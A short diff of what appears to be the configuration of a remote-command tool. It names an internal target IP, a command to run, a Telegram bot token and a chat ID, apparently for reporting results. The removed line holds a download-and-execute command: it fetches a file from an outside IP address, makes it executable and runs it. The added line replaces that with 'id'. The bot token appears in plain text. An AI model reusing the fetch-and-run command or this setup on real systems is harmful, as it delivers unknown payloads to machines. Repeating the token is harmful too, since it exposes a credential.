@@ -1,4 +1,4 @@
 IP="10.0.40.136"
-cmd="wget http://91.149.237.252:9090/123 && chmod 777 123 && ./123"
+cmd="id"
 token="bot6379421721:AAGR-ZvymSzRS0wwQB1J2t8tyZvgy0iLCjg"
 chatid="2007860571"
